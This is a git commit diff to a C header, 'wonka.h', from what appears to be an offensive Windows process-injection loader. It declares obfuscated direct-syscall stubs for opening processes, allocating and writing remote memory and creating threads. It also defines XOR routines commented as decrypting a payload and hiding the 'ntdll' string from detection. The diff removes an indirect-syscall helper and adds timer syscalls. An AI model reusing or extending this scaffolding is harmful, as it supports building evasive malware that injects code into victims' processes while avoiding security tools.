dd74b1b061e03c2a6fc721348c3bd6f6056fd1d8
max <40187297+maxbarkouras@users.noreply.github.com>
2024-04-16 08:16:54 -0700

    Update wonka.h

--- wonka.h
+++ wonka.h
@@ -1,30 +1,13 @@
 #pragma once
-#pragma comment(lib, "ntdll")
 
-#include <Windows.h>
 #include <stdio.h>
 
+#define okay(msg, ...) printf("[+] " msg "\n", ##__VA_ARGS__);
+#define info(msg, ...) printf("[*] " msg "\n", ##__VA_ARGS__);
+#define warn(msg, ...) printf("[!] " msg "\n", ##__VA_ARGS__);
 #define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
 #define MAX_WSTR_SIZE 512
 
-//IndirectPrelude code provided by crow.rip
-BOOL IndirectPrelude(IN HMODULE hNTDLL, IN LPCSTR NtFunction, OUT UINT_PTR* Syscall) {
-	UINT_PTR NtFunctionAddress = NULL;
-	BYTE SyscallOpcode[2] = { 0x0F, 0x05 };
-	NtFunctionAddress = (UINT_PTR)GetProcAddress(hNTDLL, NtFunction);
-	if (NtFunctionAddress == NULL) {
-		warn("[GetProcAddress] failed, error: 0x%lx", GetLastError());
-		return NULL;
-	}
-	*Syscall = NtFunctionAddress + 0x12;
-	if (memcmp(SyscallOpcode, Syscall, sizeof(SyscallOpcode)) == 0) {
-	}
-	else {
-		return NULL;
-	}
-}
-
-//define xor decryption method for payload
 void xor_decrypt(unsigned char* data, int data_length, const char* key) {
 	int key_length = strlen(key);
 	for (int i = 0; i < data_length; ++i) {
@@ -32,7 +15,6 @@ void xor_decrypt(unsigned char* data, int data_length, const char* key) {
 	}
 }
 
-//define method for converting decrypted ntdll string to LPCWSTR
 LPCWSTR ConvertToLPCWSTR(const char* str) {
 	static wchar_t wstr[MAX_WSTR_SIZE];
 	int size = MultiByteToWideChar(CP_ACP, 0, str, -1, wstr, MAX_WSTR_SIZE);
@@ -42,7 +24,6 @@ LPCWSTR ConvertToLPCWSTR(const char* str) {
 	return wstr;
 }
 
-//define method for decrypting NTDLL to avoid string used in code
 void DecryptXOR(char* encrypted_data, size_t data_length, const char* key, size_t key_length) {
 	int key_index = 0;
 	for (size_t i = 0; i < data_length; i++) {
@@ -52,8 +33,17 @@ void DecryptXOR(char* encrypted_data, size_t data_length, const char* key, size_
 	}
 }
 
+#ifndef InitializeObjectAttributes
+#define InitializeObjectAttributes( p, n, a, r, s ) { \
+	(p)->Length = sizeof( OBJECT_ATTRIBUTES );        \
+	(p)->RootDirectory = r;                           \
+	(p)->Attributes = a;                              \
+	(p)->ObjectName = n;                              \
+	(p)->SecurityDescriptor = s;                      \
+	(p)->SecurityQualityOfService = NULL;             \
+}
+#endif
 
-//define all structures
 typedef struct _UNICODE_STRING
 {
 	USHORT Length;
@@ -61,61 +51,108 @@ typedef struct _UNICODE_STRING
 	PWSTR  Buffer;
 } UNICODE_STRING, * PUNICODE_STRING;
 
-typedef struct _PS_ATTRIBUTE {
-	ULONG_PTR Attribute;
+typedef struct _PS_ATTRIBUTE
+{
+	ULONG  Attribute;
 	SIZE_T Size;
-	union {
-		ULONG_PTR Value;
+	union
+	{
+		ULONG Value;
 		PVOID ValuePtr;
-	};
+	} u1;
 	PSIZE_T ReturnLength;
-}PS_ATTRIBUTE, * PPS_ATTRIBUTE;
+} PS_ATTRIBUTE, * PPS_ATTRIBUTE;
 
-typedef struct _PS_ATTRIBUTE_LIST {
-	SIZE_T TotalLength;
+typedef struct _OBJECT_ATTRIBUTES
+{
+	ULONG           Length;
+	HANDLE          RootDirectory;
+	PUNICODE_STRING ObjectName;
+	ULONG           Attributes;
+	PVOID           SecurityDescriptor;
+	PVOID           SecurityQualityOfService;
+} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;
+
+typedef enum _TIMER_INFORMATION_CLASS
+{
+	TimerBasicInformation
+} TIMER_INFORMATION_CLASS, * PTIMER_INFORMATION_CLASS;
+
+typedef struct _CLIENT_ID
+{
+	HANDLE UniqueProcess;
+	HANDLE UniqueThread;
+} CLIENT_ID, * PCLIENT_ID;
+
+typedef enum _TIMER_TYPE
+{
+	NotificationTimer,
+	SynchronizationTimer
+} TIMER_TYPE, * PTIMER_TYPE;
+
+typedef VOID(CALLBACK* PTIMER_APC_ROUTINE)(
+	IN PVOID TimerContext,
+	IN ULONG TimerLowValue,
+	IN LONG TimerHighValue);
+
+typedef struct _PS_ATTRIBUTE_LIST
+{
+	SIZE_T       TotalLength;
 	PS_ATTRIBUTE Attributes[1];
-}PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;
+} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;
 
-typedef struct _OBJECT_ATTRIBUTES {
-	ULONG Length;
-	VOID* RootDirectory;
-	struct _UNICODE_STRING* ObjectName;
-	ULONG Attributes;
-	VOID* SecurityDescriptor;
-	VOID* SecurityQualityOfService;
-}OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;
+EXTERN_C NTSTATUS WFSO(
+	IN HANDLE ObjectHandle,
+	IN BOOLEAN Alertable,
+	IN PLARGE_INTEGER TimeOut OPTIONAL);
 
-typedef struct _CLIENT_ID {
-	VOID* UniqueProcess;
-	VOID* UniqueThread;
-}CLIENT_ID, * PCLIENT_ID;
+EXTERN_C NTSTATUS C(
+	IN HANDLE Handle);
 
-typedef struct _INITIAL_TEB {
-	struct {
-		PVOID OldStackBase;
-		PVOID OldStackLimit;
-	}
-	OldInitialTeb;
-	PVOID StackBase;
-	PVOID StackLimit;
-	PVOID StackAllocationBase;
-}INITIAL_TEB, * PINITIAL_TEB;
-
-
-//define syscalls
-EXTERN_C NTSTATUS OP(
-	OUT PHANDLE pH,
+EXTERN_C NTSTATUS NtCreateTimer(
+	OUT PHANDLE TimerHandle,
 	IN ACCESS_MASK DesiredAccess,
-	IN POBJECT_ATTRIBUTES OA,
+	IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
+	IN TIMER_TYPE TimerType);
+
+EXTERN_C NTSTATUS NtOpenTimer(
+	OUT PHANDLE TimerHandle,
+	IN ACCESS_MASK DesiredAccess,
+	IN POBJECT_ATTRIBUTES ObjectAttributes);
+
+EXTERN_C NTSTATUS NtQueryTimer(
+	IN HANDLE TimerHandle,
+	IN TIMER_INFORMATION_CLASS TimerInformationClass,
+	OUT PVOID TimerInformation,
+	IN ULONG TimerInformationLength,
+	OUT PULONG ReturnLength OPTIONAL);
+
+EXTERN_C NTSTATUS OP(
+	OUT PHANDLE ProcessHandle,
+	IN ACCESS_MASK DesiredAccess,
+	IN POBJECT_ATTRIBUTES ObjectAttributes,
 	IN PCLIENT_ID ClientId OPTIONAL);
 
 EXTERN_C NTSTATUS AVM(
-     HANDLE pH,
-     PVOID *bA,
-     ULONG ZeroBits,
-     PSIZE_T rS,
-     ULONG AllocationType,
-     ULONG Protect);
+	IN HANDLE ProcessHandle,
+	IN OUT PVOID* BaseAddress,
+	IN ULONG ZeroBits,
+	IN OUT PSIZE_T RegionSize,
+	IN ULONG AllocationType,
+	IN ULONG Protect);
+
+EXTERN_C NTSTATUS NtCancelTimer(
+	IN HANDLE TimerHandle,
+	OUT PBOOLEAN CurrentState OPTIONAL);
+
+EXTERN_C NTSTATUS NtSetTimer(
+	IN HANDLE TimerHandle,
+	IN PLARGE_INTEGER DueTime,
+	IN PTIMER_APC_ROUTINE TimerApcRoutine OPTIONAL,
+	IN PVOID TimerContext OPTIONAL,
+	IN BOOLEAN ResumeTimer,
+	IN LONG Period OPTIONAL,
+	OUT PBOOLEAN PreviousState OPTIONAL);
 
 EXTERN_C NTSTATUS WVM(
 	IN HANDLE ProcessHandle,
@@ -137,10 +174,3 @@ EXTERN_C NTSTATUS CT(
 	IN SIZE_T MaximumStackSize,
 	IN PPS_ATTRIBUTE_LIST AttributeList OPTIONAL);
 
-EXTERN_C NTSTATUS WFSO(
-	_In_ HANDLE Handle,
-	_In_ BOOLEAN Alertable,
-	_In_opt_ PLARGE_INTEGER Timeout);
-
-EXTERN_C NTSTATUS C(
-	IN HANDLE Handle);
